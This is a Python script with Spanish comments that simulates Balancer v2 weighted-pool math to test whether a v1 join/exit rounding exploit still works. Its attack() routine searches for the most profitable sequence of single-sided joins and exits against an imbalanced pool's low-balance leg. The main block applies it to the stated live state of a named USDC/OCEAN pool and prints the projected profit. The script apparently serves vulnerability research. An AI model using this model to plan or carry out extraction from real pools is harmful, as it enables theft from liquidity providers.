"""
¿Sobrevive en Balancer v2 el exploit de v1?  Modelo de la aritmetica EXACTA de

  pkg/pool-weighted/contracts/WeightedMath.sol
    _calcTokenInGivenExactBptOut   (l.274)   <- equivalente a joinswapPoolAmountOut
    _calcTokenOutGivenExactBptIn   (l.423)   <- equivalente a exitswapPoolAmountIn
  con _MAX_INVARIANT_RATIO = 3e18 y _MIN_INVARIANT_RATIO = 0.7e18 (l.42/44)

Redondeo segun el fuente: entrada hacia ARRIBA ("Token in, so we round up
overall"), salida hacia ABAJO ("Token out, so we round down overall").
Se usa Decimal con 60 digitos y se redondea el ultimo wei en la direccion que
marca el contrato; a escala de miles de dolares la diferencia de 1 wei es nula.

Uso: python3 v2_weighted.py
"""
from decimal import Decimal, getcontext, ROUND_CEILING, ROUND_FLOOR

getcontext().prec = 60
ONE = Decimal(10) ** 18
MAX_INVARIANT_RATIO = Decimal("3e18")
MIN_INVARIANT_RATIO = Decimal("0.7e18")


def up(x):      # redondeo hacia arriba al wei
    return int(x.to_integral_value(rounding=ROUND_CEILING))


def down(x):    # hacia abajo
    return int(x.to_integral_value(rounding=ROUND_FLOOR))


class V2Weighted:
    """dos tokens, balances y supply en 1e18, pesos normalizados en 1e18"""

    def __init__(self, bal_a, bal_b, w_a, fee, supply=None):
        self.b = [Decimal(bal_a) * ONE, Decimal(bal_b) * ONE]
        self.w = [Decimal(w_a), Decimal(1) - Decimal(w_a)]
        self.fee = Decimal(fee)
        # en v2 el supply inicial = invariante (WeightedPool._onInitializePool)
        self.supply = supply if supply is not None else self.invariant()

    def invariant(self):
        # invariante de un pool ponderado = prod(b_i ^ w_i)  (geometrica)
        inv = Decimal(1)
        for b, w in zip(self.b, self.w):
            inv *= b ** w
        return inv

    # --- WeightedMath._calcTokenInGivenExactBptOut (l.274)
    def token_in_given_bpt_out(self, i, bpt_out):
        inv_ratio = Decimal(self.supply + bpt_out) / self.supply          # divUp
        assert inv_ratio <= MAX_INVARIANT_RATIO / ONE, "MAX_OUT_BPT_FOR_TOKEN_IN"
        balance_ratio = inv_ratio ** (Decimal(1) / self.w[i])             # powUp
        amt_wo_fee = self.b[i] * (balance_ratio - 1)                      # mulUp
        taxable = amt_wo_fee * (1 - self.w[i])                            # mulUp
        non_taxable = amt_wo_fee - taxable
        return non_taxable + taxable / (1 - self.fee)                     # divUp

    # --- WeightedMath._calcTokenOutGivenExactBptIn (l.423)
    def token_out_given_bpt_in(self, i, bpt_in):
        inv_ratio = Decimal(self.supply - bpt_in) / self.supply           # divUp
        if inv_ratio < MIN_INVARIANT_RATIO / ONE:
            raise ValueError("MIN_BPT_IN_FOR_TOKEN_OUT")
        balance_ratio = inv_ratio ** (Decimal(1) / self.w[i])             # powUp
        amt_wo_fee = self.b[i] * (1 - balance_ratio)                      # mulDown(complement)
        taxable = amt_wo_fee * (1 - self.w[i])                            # mulUp
        non_taxable = amt_wo_fee - taxable
        return non_taxable + taxable * (1 - self.fee)                     # mulDown

    # --- mutadores (lo que hace el Vault al liquidar el join/exit)
    def join_single(self, i, bpt_out):
        amt = self.token_in_given_bpt_out(i, bpt_out)
        self.b[i] += amt if isinstance(amt, Decimal) else Decimal(amt)
        self.supply += bpt_out
        return amt

    def exit_single(self, i, bpt_in):
        out = self.token_out_given_bpt_in(i, bpt_in)
        self.b[i] -= out
        self.supply -= bpt_in
        return out


def attack(bal_dust, bal_big, w_dust, fee, max_joins=8, cap_spend=None, supply_mult=1):
    """Ataca la pata 'dust' (0) y sale por la grande (1).
    Barre tamaño de paso (bptOut = frac*supply) x n, que es lo que el atacante
    elige: el tope del contrato es frac<=2, pero lo optimo casi nunca es el tope."""
    tvl = float(bal_dust) + float(bal_big)
    cap = cap_spend if cap_spend is not None else 50 * tvl
    best = None
    for frac in ("0.001", "0.005", "0.02", "0.05", "0.1", "0.2", "0.5", "1", "2"):
        fr = Decimal(frac)
        for n in range(1, max_joins + 1):
            p = V2Weighted(bal_dust, bal_big, w_dust, fee)
            if supply_mult != 1:
                p.supply = p.invariant() * Decimal(str(supply_mult))
            sup0 = p.supply
            mine, spent, ok = 0, Decimal(0), True
            for _ in range(n):
                bpt_out = int(fr * p.supply)
                if bpt_out < 1:
                    ok = False
                    break
                spent += p.join_single(0, bpt_out)
                mine += bpt_out
                if float(spent / ONE) > cap:
                    ok = False
                    break
            if not ok:
                break
            f = Decimal(mine) / p.supply
            got, exits = Decimal(0), 0
            while mine > 0 and exits < 500:
                chunk = min(mine, int(Decimal("0.3") * p.supply))
                if chunk < 1:
                    break
                try:
                    got += p.exit_single(1, chunk)
                except ValueError:
                    break
                mine -= chunk
                exits += 1
            r = dict(f=float(f), spent=float(spent / ONE), got=float(got / ONE),
                     pnl=float((got - spent) / ONE), joins=n, exits=exits,
                     frac=frac, supply0=float(sup0 / ONE))
            if best is None or r["pnl"] > best["pnl"]:
                best = r
    return best


if __name__ == "__main__":
    print("Estado real de 0x9a16bddf: USDC(20%) = $16,38 / OCEAN(80%) = $135.341,49, fee 2,5%\n")
    r = attack(Decimal("16.3835"), Decimal("135341.4938"), Decimal("0.2"), Decimal("0.025"))
    print(f"  v2: {r['joins']} joins + {r['exits']} exits | f={r['f']*100:.2f}% "
          f"| depósito ${r['spent']:,.0f} | salida ${r['got']:,.0f} | P&L ${r['pnl']:,.0f}")
    print(f"  v1 (modelo exacto, mismo estado): f=78,03% | depósito $36.303 | "
          f"salida $133.942 | P&L $97.639\n")

    print("Control: pool EQUILIBRADO (ρ=1) con el mismo TVL")
    r = attack(Decimal("27068.30"), Decimal("108273.19"), Decimal("0.2"), Decimal("0.003"))
    print(f"  v2: {r['joins']} joins + {r['exits']} exits | f={r['f']*100:.2f}% "
          f"| depósito ${r['spent']:,.0f} | salida ${r['got']:,.0f} | P&L ${r['pnl']:,.0f}")

    print("\nSensibilidad al peso (pata polvo, fee 0,3%):")
    print(f"  {'w':>5}{'f máx 1 llamada':>18}{'P&L v2':>14}   (v1: tope 1 llamada)")
    for w in (0.05, 0.1, 0.2, 0.5, 0.8):
        big = Decimal("200000") * (Decimal(1) - Decimal(str(w)))
        r = attack(Decimal("0.01"), big, Decimal(str(w)), Decimal("0.003"))
        cap1 = 1 - 1 / (Decimal(3) ** (Decimal(1) / Decimal(str(w))))
        capv1 = 1 - 1 / (Decimal("1.5") ** Decimal(str(w)))
        print(f"  {w:>5.2f}{float(cap1)*100:>17.1f}%{r['pnl']:>14,.0f}   "
              f"tope v1: {float(capv1)*100:.1f}%/llamada")

    print("\nUmbral rho* de v2 vs v1 (TVL 200k, fee 0,3%):")
    print(f"  {'w':>5}{'rho':>7}{'P&L v2':>13}{'% TVL':>8}   {'rho* v1':>8}")
    from analyze_live import rho_star
    for w in (0.2, 0.5, 0.8):
        wd = Decimal(str(w))
        row = []
        for rho in (Decimal("0.2"), Decimal("0.4"), Decimal("0.6"), Decimal("0.8"),
                    Decimal("0.85"), Decimal("0.9"), Decimal("0.95"), Decimal("1.0")):
            tvl = Decimal("200000")
            bd = rho * wd * tvl
            bb = tvl - bd
            r = attack(bd, bb, wd, Decimal("0.003"), max_joins=4)
            row.append(f"{float(rho):>5.2f}{r['pnl']:>13,.0f}{r['pnl']/200000*100:>7.2f}%")
        print(f"  w={w:.2f}  rho* v1 (calculo previo) = {rho_star(w):.3f}")
        for line in row:
            print("       " + line)
